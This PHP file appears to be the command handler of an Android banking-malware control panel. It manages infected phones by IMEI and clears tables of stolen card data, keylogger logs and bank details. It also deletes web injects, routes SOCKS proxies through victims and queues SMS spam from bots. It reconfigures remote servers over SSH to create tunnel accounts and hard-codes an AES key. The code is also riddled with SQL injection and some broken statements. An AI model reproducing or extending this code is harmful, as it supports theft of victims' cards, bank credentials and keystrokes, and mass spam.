<?php session_start();
include '../../db.php';
include '../func.php';
include 'geoip.inc';
include 'Net/SSH2.php';
include 'Crypt/AES.php';


if (!(isset($_SESSION['user_id']))) 
{
header("Location: ../index.php");  
return;

}  
$gi = geoip_open("GeoIP.dat",GEOIP_STANDARD);
?>

<?php
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function prepare_srv_fwd($address='', $user='', $pass=''){
   $result = array();
   if (($address == '') or ($user == '') or ($pass == '')) {
      $result['status'] = 'ERROR';
      $result['status_text'] = 'Not all data has been provided';
      return $result;
   }
   $ssh = new Net_SSH2($address);
   if (!$ssh->login($user, $pass)) {
      $result['status'] = 'ERROR';
      $result['status_text'] = 'Login has been failed';
      return $result;
   }

   # create user credentionals
   $result['fwd_user'] = 'fwd-'.generateRandomString(4);
   $result['fwd_pass'] = generateRandomString(10);

   # change ssh settings
   $fwd_user = $result["fwd_user"];
   $fwd_pass = $result["fwd_pass"];
   $config_string = "Match User $fwd_user
   AllowTcpForwarding yes
   X11Forwarding no
   PermitTunnel yes
   AllowAgentForwarding no
   ForceCommand echo 'This account can only be used for port forward'";
   $ssh->exec("cat >> /etc/ssh/sshd_config << EOF\n$config_string\nEOF");
   
   # create new user
   $fwd_pass = rtrim($ssh->exec("mkpasswd -m sha-512 -S i//2oCzI -s <<< $fwd_pass"));
   $ssh->exec("useradd -m -p '$fwd_pass' $fwd_user");
   $result['status'] = 'OK';
   # restart ssh
   $ssh->exec('/etc/init.d/ssh restart');
   return $result;
}
function cryptString($str=''){
   $iv = 'kdpelsntnq;spfis';
   $key = 'QrzMwvH7zmVnMwSTWzyLJu#Ck!^f%-UvH7zmVn5Kzu%ks8GST';
   $cipher = new Crypt_AES(); 
   $cipher->setKey($key);
   $cipher->setIV($iv);
   $encrypted = $cipher->encrypt($str);
   return base64_encode($encrypted);
}
function deCryptString($str=''){
   $str = base64_decode($str);
   $iv = 'kdpelsntnq;spfis';
   $key = 'QrzMwvH7zmVnMwSTWzyLJu#Ck!^f%-UvH7zmVn5Kzu%ks8GST';
   $cipher = new Crypt_AES(); 
   $cipher->setKey($key);
   $cipher->setIV($iv);
   $decrypted = $cipher->decrypt($str);
   return $decrypted;
}

function checkSocksConnections($value=''){
   # get servers
   # get connections
   # code...
   $ssh = new Net_SSH2($address);
   if (!$ssh->login($user, $pass)) {
      $result['status'] = 'ERROR';
      $result['status_text'] = 'Login has been failed';
      return $result;
   }
}

function rmdir_recursive($dir) {
    unlink("$dir/XMPPHP");
    foreach(scandir($dir) as $file) {
        if ('.' === $file || '..' === $file) continue;
        if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
        else unlink("$dir/$file");
    }
    rmdir($dir);
    return 0;
}

?>

<?php
if (isset($_POST['cmd'])){
   if ($_POST['cmd'] == "new_admin_pass"){
      if (isset($_POST['arg'])) {$pass = md5($_POST['arg']);} else {return;}
      $update_pass_sql = "UPDATE `users` SET `user_password` = '$pass' WHERE `user_id` = 1;";
      $update_pass_sql_res = $mysqli->query($update_pass_sql);

      if ($update_pass_sql_res){
         $response = array("result" => "OK",
            "message" => "Password has been changed.",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "update_guest"){
      if (isset($_POST['g_id'])) {$id = $mysqli->real_escape_string($_POST['g_id']);} else {return;}
      if (isset($_POST['g_name'])) {$name = $mysqli->real_escape_string($_POST['g_name']);} else {return;}
      if (isset($_POST['g_pass'])) {$pass = md5($_POST['g_pass']);} else {return;}
      if (isset($_POST['g_ver'])) {$ver = $mysqli->real_escape_string($_POST['g_ver']);} else {return;}
      $update_guest_sql = "UPDATE `guest` SET `apk_version` = '$ver', `user_login` = '$name', `user_password` = '$pass' WHERE `guest_id` = $id";
      $update_guest_sql_res = $mysqli->query($update_guest_sql);
      if ($update_guest_sql_res){
         $response = array("result" => "OK",
            "message" => "Guest has been updated",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "create_guest"){
      if (isset($_POST['g_name'])) {$name = $mysqli->real_escape_string($_POST['g_name']);} else {return;}
      if (isset($_POST['g_pass'])) {$pass = md5($_POST['g_pass']);} else {return;}
      if (isset($_POST['g_ver'])) {$ver = $mysqli->real_escape_string($_POST['g_ver']);} else {return;}
      $update_guest_sql = "INSERT INTO `guest` (`guest_id`, `user_login`, `user_password`, `apk_version`) VALUES (NULL, '$name', '$pass', '$ver');";
      $update_guest_sql_res = $mysqli->query($update_guest_sql);
      if ($update_guest_sql_res){
         $response = array("result" => "OK",
            "message" => "New guest has been created",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "safe_server_jabber"){
      if (isset($_POST['server'])) {$server = $mysqli->real_escape_string($_POST['server']);} else {return;}
      if (isset($_POST['port'])) {$port = $mysqli->real_escape_string($_POST['port']);} else {return;}
      if (isset($_POST['login'])) {$login = $mysqli->real_escape_string($_POST['login']);} else {return;}
      if (isset($_POST['pass'])) {$pass = $mysqli->real_escape_string($_POST['pass']);} else {return;}
      if (isset($_POST['domain'])) {$domain = $mysqli->real_escape_string($_POST['domain']);} else {return;}

      $file_content = '<?php
$jabber_main_server = "'.$server.'";
$jabber_main_port = "'.$port.'";
$jabber_main_login = "'.$login.'";
$jabber_main_pass = "'.$pass.'";
$jabber_main_domain = "'.$domain.'";
?>';

      if (file_put_contents("../XMPPHP/creds.php", $file_content)){
         $response = array("result" => "OK",
            "message" => "Server jabber address was changed",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "add_jabber_address"){
      if (isset($_POST['address'])) {$address = $mysqli->real_escape_string($_POST['address']);} else {return;}
      if (isset($_POST['bot_event'])) {$bot_event = $mysqli->real_escape_string($_POST['bot_event']);} else {return;}
      if (isset($_POST['card_event'])) {$card_event = $mysqli->real_escape_string($_POST['card_event']);} else {return;}
      if (isset($_POST['bank_event'])) {$bank_event = $mysqli->real_escape_string($_POST['bank_event']);} else {return;}
      if (isset($_POST['dbot_event'])) {$dbot_event = $mysqli->real_escape_string($_POST['dbot_event']);} else {return;}
      


      $add_jabber_notification_sql = "INSERT INTO `jabber_notifications` (`id`, `address`, `bot_event`, `card_event`, `bank_event`, `dedicated_event`) VALUES (NULL, '$address', $bot_event, $card_event, $bank_event, $dbot_event);";
      $add_jabber_notification_sql_res = $mysqli->query($add_jabber_notification_sql);
      if ($add_jabber_notification_sql_res){
         $response = array("result" => "OK",
            "message" => "New jabber address for notifications was added.",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "delete_jabber_address"){
      if (isset($_POST['id'])) {$jabber_id = $mysqli->real_escape_string($_POST['id']);} else {return;}
      
      $delete_jabber_id_sql = "DELETE FROM `jabber_notifications` WHERE `id` = $jabber_id";
      $delete_jabber_id_sql_res = $mysqli->query($delete_jabber_id_sql);
      if ($delete_jabber_id_sql_res){
         $response = array("result" => "OK",
            "message" => "Jabber address has been deleted.",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "set_jabber_notifications"){
      if (isset($_POST['id'])) {$bot_id = $mysqli->real_escape_string($_POST['id']);} else {return;}
      if (isset($_POST['jabber_notify'])) {$notify = $mysqli->real_escape_string($_POST['jabber_notify']);} else {return;}

      if ($notify){
         $notification = "0";
      } else {
         $notification = "1";
      }
      
      $set_jabber_notify_sql = "UPDATE `kliets` SET `j_notify` = '$notification' WHERE `id` = $bot_id;";
      $set_jabber_notify_sql_res = $mysqli->query($set_jabber_notify_sql);
      if ($set_jabber_notify_sql_res){
         $response = array("result" => "OK",
            "message" => "Jabber notification was changed",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "set_settings"){
      //if (isset($_POST['g_id'])) {$id = $_POST['g_id'];} else {return;}
      if (isset($_POST['data'])) {$data = $_POST['data'];} else {return;}
      $settings = json_decode($data);
      
      $disable_startup_comm_sql = "UPDATE `com_config` SET `startup` = 0 WHERE 1";
      $disable_startup_comm_sql_res = $mysqli->query($disable_startup_comm_sql);

      foreach ($settings as $command) {
         $new_set_sql = "";
         $comm_id = $comm_num = $comm_txt = NULL;
         $comm_id = $command[0];
         $comm_num = $command[1];
         $comm_txt = $command[2];
         if ($comm_num != NULL) {$new_set_sql .= ",`startup_number` = '$comm_num'";}
         if ($comm_txt != NULL) {$new_set_sql .= ",`startup_text` = '$comm_txt'";}
         $set_command_sql = "UPDATE `com_config` SET `startup` = 1 $new_set_sql WHERE `id` = $comm_id";
         $set_command_sql_res = $mysqli->query($set_command_sql);
         # code...
      }

      if ($set_command_sql_res){
         $response = array("result" => "OK",
            "message" => "Settings has been saved.",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "delete_guest"){
      if (isset($_POST['g_id'])) {$id = $_POST['g_id'];} else {return;}

      $update_guest_sql = $mysqli->real_escape_string("DELETE FROM `guest` WHERE `guest_id` = $id");
      $update_guest_sql_res = $mysqli->query($update_guest_sql);
      if ($update_guest_sql_res){
         $response = array("result" => "OK",
            "message" => "Guest has been deleted.",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "change_bot_version"){
      if (isset($_POST['old_name'])) {$old_name = $mysqli->real_escape_string($_POST['old_name']);} else {return;}
      if (isset($_POST['new_name'])) {$new_name = $mysqli->real_escape_string($_POST['new_name']);} else {return;}

      $update_version_sql = "UPDATE `kliets` SET `version_apk` = '$new_name' WHERE `version_apk` REGEXP '$old_name'";
      $update_version_sql_res = $mysqli->query($update_version_sql);
      if ($update_version_sql_res){
         $response = array("result" => "OK",
            "message" => "Version has been changed successful.",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "update_comment"){
      if (isset($_POST['id'])) {$id = $mysqli->real_escape_string($_POST['id']);} else {return;}
      if (isset($_POST['comment'])) {$comment = $mysqli->real_escape_string($_POST['comment']);} else {return;}

      $update_comment_sql = "UPDATE `kliets` SET `comment` = '$comment' WHERE `id` = $id;";
      $update_comment_sql_res = $mysqli->query($update_comment_sql);
      if ($update_comment_sql_res){
         $response = array("result" => "OK",
            "message" => "Comment has been updated!",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "add_proxy_server"){
      if (isset($_POST['address']) and ($_POST['address'] != '')) {$address = $mysqli->real_escape_string($_POST['address']);} else {return;}
      if (isset($_POST['user']) and ($_POST['user'] != '')) {$user = $mysqli->real_escape_string($_POST['user']);} else {return;}
      if (isset($_POST['pass']) and ($_POST['pass'] != '')) {$pass = $mysqli->real_escape_string($_POST['pass']);} else {return;}
      if (isset($_POST['note'])) {$note = $mysqli->real_escape_string($_POST['note']);}

      # check country
      $country = strtolower(geoip_country_code_by_addr($gi,$address));
      # prepare server
      $srv = prepare_srv_fwd($address, $user, $pass);
      if ($srv["status"] == "OK") {
      	$srv_status = '1';
      	$fwd_user = $srv["fwd_user"];
      	$fwd_pass = $srv["fwd_pass"];
         $srv_status_text = "Ready for work";
      } else {
         $srv_status_text = $srv["status_text"];
         $srv_status = '0';
      }

      $add_server_sql = "INSERT INTO `proxy_servers` (`id`, `ip`, `user`, `pass`, `forward_user`, `forward_pass`, `root`, `time`, `country`, `note`, `status`, `status_text`) VALUES (NULL, '$address', '$user', '".cryptString($pass)."', '$fwd_user', '$fwd_pass', '1', '".time()."', '$country', '$note', '$srv_status', '$srv_status_text');";
      $add_server_sql_res = $mysqli->query($add_server_sql);
      if ($add_server_sql_res){
         $response = array("result" => "OK",
            "message" => "Server has been added",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "delete_proxy_server"){
      if (isset($_POST['id']) and ($_POST['id'] != '')) {$id = $mysqli->real_escape_string($_POST['id']);} else {return;}

      $delete_server_sql = "DELETE FROM `proxy_servers` WHERE `id` = $id";
      $delete_server_sql_res = $mysqli->query($delete_server_sql);
      if ($delete_server_sql_res){
         $response = array("result" => "OK",
            "message" => "Server has been deleted",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "update_proxy_note"){
      if (isset($_POST['id']) and ($_POST['id'] != '')) {$id = $mysqli->real_escape_string($_POST['id']);} else {return;}
      if (isset($_POST['note']) and ($_POST['note'] != '')) {$note = $mysqli->real_escape_string($_POST['note']);}

      $update_server_sql = "UPDATE `proxy_servers` SET `note` = '$note' WHERE `id` = $id;";
      $update_server_sql_res = $mysqli->query($update_server_sql);
      if ($update_server_sql_res){
         $response = array("result" => "OK",
            "message" => "Note was updated",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "delete_socks_connection"){
      if (isset($_POST['id']) and ($_POST['id'] != '')) {$id = $mysqli->real_escape_string($_POST['id']);} else {return;}
      $get_imei_from_connect_sql = "SELECT IMEI FROM `socks` WHERE `id` = $id";
      $get_imei_from_connect_sql_res = $mysqli->query($get_imei_from_connect_sql);
      $row = mysqli_fetch_assoc($get_imei_from_connect_sql_res);
      $imei = $row["IMEI"];

      # delete connection from db
      $delete_socks_sql = "DELETE FROM `socks` WHERE `id` = $id";
      $delete_socks_sql_res = $mysqli->query($delete_socks_sql);
      # send command for kill socks
      $send_command_sql = "INSERT INTO `commands` (`IMEI`, `command`, `command_name`) VALUES ('$imei', 'startSocks=false|endcmd::', 'start socks session')";
      $send_command_sql_res = $mysqli->query($send_command_sql);

      if ($delete_socks_sql_res){
         $response = array("result" => "OK",
            "message" => "Connection was deleted",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "cleanup_logs"){
      //if (isset($_FILES["filename"])) {$filename = $_FILES["filename"]["tmp_name"];} else {return;}
      //var_dump($_POST['cmd']);
      
      /*if($_FILES["filename"]['type'] != "image/png"){
          return;
      }*/
      //var_dump(getcwd());
      $dir = "../../logs";
      $imeis = array();
      $get_all_imeis_sql = "SELECT `IMEI` FROM `kliets` WHERE 1";
      //$get_all_imeis_sql_res = $mysqli->query($get_all_imeis_sql);
      foreach($mysqli->query($get_all_imeis_sql) as $row){
         array_push($imeis, $row["IMEI"]);
      }
      //var_dump($imeis);

      $files = scandir($dir);
      foreach ($files as $file) {
         if (($file != ".") or ($file != "..") or ($file != "apps") or ($file != "hist") or ($file != "")){
            
            $filename = explode(".", $file);
            $bDelete = 1;
            foreach ($imeis as $imei) {
               //echo "find $imei in $filename[0]\n";
               $pos = strpos($filename[0], $imei);
               if ($pos !== false){
                  //echo "found!\n";
                  $bDelete = 0;
               } 
            }
            if ($bDelete) {
               //echo $dir."/".$filename[0].".log\n";
               $path_for_delete = getcwd()."/".$dir."/".$filename[0].".log";
               $path_for_delete = str_replace(' ', '\ ', $path_for_delete);
               $path_for_delete = str_replace('?', '\?', $path_for_delete);
               $path_for_delete = str_replace(':', '\:', $path_for_delete);
               unlink($path_for_delete);
            }
         }
      }
      $response = array("result" => "OK",
            "message" => "Log files has been cleanup.",
            );

      echo json_encode($response);
   }
   if ($_POST['cmd'] == "cleanup_contacts"){
      $cleanup_stats_sql = "TRUNCATE TABLE `contacts`";
      $cleanup_stats_sql_res = $mysqli->query($cleanup_stats_sql);
      if ($cleanup_stats_sql_res){
         $response = array("result" => "OK",
            "message" => "Contacts has been cleanup",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "cleanup_keylogger"){
      $cleanup_stats_sql = "TRUNCATE TABLE `key_log`";
      $cleanup_stats_sql_res = $mysqli->query($cleanup_stats_sql);
      if ($cleanup_stats_sql_res){
         $response = array("result" => "OK",
            "message" => "Keylogger logs has been cleanup",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "cleanup_all_cc"){
      $cleanup_stats_sql = "TRUNCATE TABLE `cc_info`";
      $cleanup_stats_sql_res = $mysqli->query($cleanup_stats_sql);
      if ($cleanup_stats_sql_res){
         $response = array("result" => "OK",
            "message" => "All CC has been cleanup from db",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "cleanup_all_banks"){
      $cleanup_banks_sql = "TUPDATE `kliets` SET `info`= '' WHERE 1";
      $cleanup_banks_sql_res = $mysqli->query($cleanup_banks_sql);
      if ($cleanup_banks_sql_res){
         $response = array("result" => "OK",
            "message" => "All Banks has been cleanup from db",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "delete_command"){
      if (isset($_POST['imei']) and ($_POST['imei'] != '')) {$imei = $mysqli->real_escape_string($_POST['imei']);} else {return;}
      if (isset($_POST['cmd_name']) and ($_POST['cmd_name'] != '')) {$cmd_name = $mysqli->real_escape_string($_POST['cmd_name']);}else {return;}

      $cleanup_stats_sql = "DELETE FROM `commands` WHERE `IMEI` = '$imei' and `command_name` = '$cmd_name'";
      $cleanup_stats_sql_res = $mysqli->query($cleanup_stats_sql);
      if ($cleanup_stats_sql_res){
         $response = array("result" => "OK",
            "message" => "Command was delete successful",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "delete_inject"){
      if (isset($_POST['name']) and ($_POST['name'] != '')) {$name = $mysqli->real_escape_string($_POST['name']);}else {return;}

      if (rmdir_recursive("../../inj/$name")){
         $response = array("result" => "OK",
            "message" => "Inject was delete successful",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Inject was delete successful",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "add_answer_rule"){
      if (isset($_POST['IMEI_rule']) and ($_POST['IMEI_rule'] != '')) {$IMEI_rule = $mysqli->real_escape_string($_POST['IMEI_rule']);}else {return;}
      if (isset($_POST['reg_rule']) and ($_POST['reg_rule'] != '')) {$reg_rule = $mysqli->real_escape_string($_POST['reg_rule']);}else {return;}
      if (isset($_POST['action_rule']) and ($_POST['action_rule'] != '')) {$action_rule = $mysqli->real_escape_string($_POST['action_rule']);}else {return;}
      if (isset($_POST['param1_rule']) and ($_POST['param1_rule'] != '')) {$param1_rule = $mysqli->real_escape_string($_POST['param1_rule']);}else {return;}
      if (isset($_POST['param2_rule']) and ($_POST['param2_rule'] != '')) {$param2_rule = $mysqli->real_escape_string($_POST['param2_rule']);}else {return;}

      $add_answer_rule_sql = "INSERT INTO `answer_rules` (imei, reg_rule, action, param1, param2) VALUES ('$IMEI_rule', '$reg_rule', '$action_rule', '$param1_rule', '$param2_rule')";
      $add_answer_rule_sql_res = $mysqli->query($add_answer_rule_sql);

      if ($add_answer_rule_sql_res){
         $response = array("result" => "OK",
            "message" => "AutoAnswer rule was added successful",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong... :(",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "delete_answer_rule"){
      if (isset($_POST['id']) and ($_POST['id'] != '')) {$id = $mysqli->real_escape_string($_POST['id']);}else {return;}

      $del_answer_rule_sql = "DELETE FROM `answer_rules` WHERE `id` = $id";
      $del_answer_rule_sql_res = $mysqli->query($del_answer_rule_sql);

      if ($del_answer_rule_sql_res){
         $response = array("result" => "OK",
            "message" => "AutoAnswer rule was deleted successful",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong... :(",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "cleanup_all_tables"){
      $cleanup_stats_sql = "TRUNCATE TABLE `kliets`";
      $cleanup_cc_sql = "TRUNCATE TABLE `cc_info`";
      $cleanup_proxy_sql = "TRUNCATE TABLE `proxy_servers`";
      $cleanup_socks_sql = "TRUNCATE TABLE `socks`";
      $cleanup_s_apps_sql = "TRUNCATE TABLE `stat_apps`";
      $cleanup_s_hist_sql = "TRUNCATE TABLE `stat_hist`";
      $cleanup_task_sql = "TRUNCATE TABLE `task`";
      $cleanup_guest_sql = "TRUNCATE TABLE `guest`";
      $cleanup_commands_sql = "TRUNCATE TABLE `commands`";
      $cleanup_client_history_sql = "TRUNCATE TABLE `client_history`";
      $cleanup_logs_sql = "TRUNCATE TABLE `logs`";

      $cleanup_stats_sql_res = $mysqli->query($cleanup_stats_sql);
      $cleanup_cc_sql_res = $mysqli->query($cleanup_cc_sql);
      $cleanup_proxy_sql_res = $mysqli->query($cleanup_proxy_sql);
      $cleanup_socks_sql_res = $mysqli->query($cleanup_socks_sql);
      $cleanup_s_apps_sql_res = $mysqli->query($cleanup_s_apps_sql);
      $cleanup_s_hist_sql_res = $mysqli->query($cleanup_s_hist_sql);
      $cleanup_task_sql_res = $mysqli->query($cleanup_task_sql);
      $cleanup_guest_sql_res = $mysqli->query($cleanup_guest_sql);
      $cleanup_commands_sql_res = $mysqli->query($cleanup_commands_sql);
      $cleanup_client_history_sql_res = $mysqli->query($client_history_sql);
      $cleanup_logs_sql_res = $mysqli->query($cleanup_logs_sql);
      if ($cleanup_stats_sql_res){
         $response = array("result" => "OK",
            "message" => "All bots was cleanup from db",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "recalculate_apps_stat"){
      $cleanup_stats_sql = "TRUNCATE TABLE `stat_apps`";
      $cleanup_stats_sql_res = $mysqli->query($cleanup_stats_sql);
      if ($cleanup_stats_sql_res){
         $dir = "../../logs/apps";
         $files = scandir($dir);
         foreach ($files as $file) {
            if (($file != ".") or ($file != "..") or ($file != "")){
               $file_content = file_get_contents("$dir/$file");
               foreach (explode("\n", $file_content) as $app) {
                  if (($app != "") and ($app != " ")){
                     checkApp($app, $mysqli);
                  }
               }
            }
         }
         $response = array("result" => "OK",
            "message" => "App stat has been recalculated!",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "recalculate_hist_stat"){
      $cleanup_stats_sql = "TRUNCATE TABLE `stat_hist`";
      $cleanup_stats_sql_res = $mysqli->query($cleanup_stats_sql);
      if ($cleanup_stats_sql_res){
         $dir = "../../logs/hist";
         $files = scandir($dir);
         foreach ($files as $file) {
            if (($file != ".") or ($file != "..") or ($file != "")){
               $file_content = file_get_contents("$dir/$file");
               foreach (explode("\n", $file_content) as $app) {
                  if (($app != "") and ($app != " ")){
                     checkHist($app, $mysqli);
                  }
               }
            }
         }
         $response = array("result" => "OK",
            "message" => "History stat has been recalculated!",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "wide-mode"){
      $_SESSION["wide-mode"] = $_POST['mode'];
      if (true){
         $response = array("result" => "OK",
            "message" => "Wide mode has been updated",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "changeTableSettings"){
      $table = $_POST['page'];
      if ($table == 'user_id') return;
      $_SESSION[$table] = json_decode($_POST['data'], true);
      if (true){
         $response = array("result" => "OK",
            "message" => "New table settings has been set",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
   if ($_POST['cmd'] == "sendSMSspam"){
      if (isset($_POST['message']) and ($_POST['message'] != '')) {$message = $mysqli->real_escape_string($_POST['message']);} else {return;}
      if (isset($_POST['phones']) and ($_POST['phones'] != '')) {$phones = $mysqli->real_escape_string($_POST['phones']);} else {return;}

      $phone_ar = explode('\n', $phones);
      $phones_ar = array();
      $imeis_ar = array();
      $i = 0;
      $str = '';
      foreach ($phone_ar as $phone) {
         if ($i < 100){
            $str .= $phone.",";
            $i = $i + 1;
         } else {
            $i = 0;
            array_push($phones_ar, rtrim($str));
            $str = '';
         }
      }

      if ($str != '') { array_push($phones_ar, rtrim($str));}
      $get_imeis_sql = "SELECT `IMEI` FROM `kliets`";
      foreach ($mysqli->query($get_imeis_sql) as $imei) {
            array_push($imeis_ar, $imei["IMEI"]);
      }
      
      $im = 0;
      foreach ($phones_ar as $phones) {
         foreach (explode(",",$phones) as $phone) {
            if ($phone != ''){
               $send_command_sql = "INSERT INTO `commands` (`IMEI`, `command`, `command_name`) VALUES ('$imeis_ar[$im]', 'sendSMSspam|number=$phone|text=$message|endcmd::', 'sms spam to $phone')";
               $send_command_sql_res = $mysqli->query($send_command_sql);
            }
         }
         $im += 1;
      }

      if ($table == 'user_id') return;
      $_SESSION[$table] = json_decode($_POST['data'], true);
      if (true){
         $response = array("result" => "OK",
            "message" => "Messages was added to commands",
            );
      }else {
         $response = array("result" => "ERROR",
            "message" => "Something went wrong...",
            );
      }
      echo json_encode($response);
   }
}

geoip_close($gi);

?>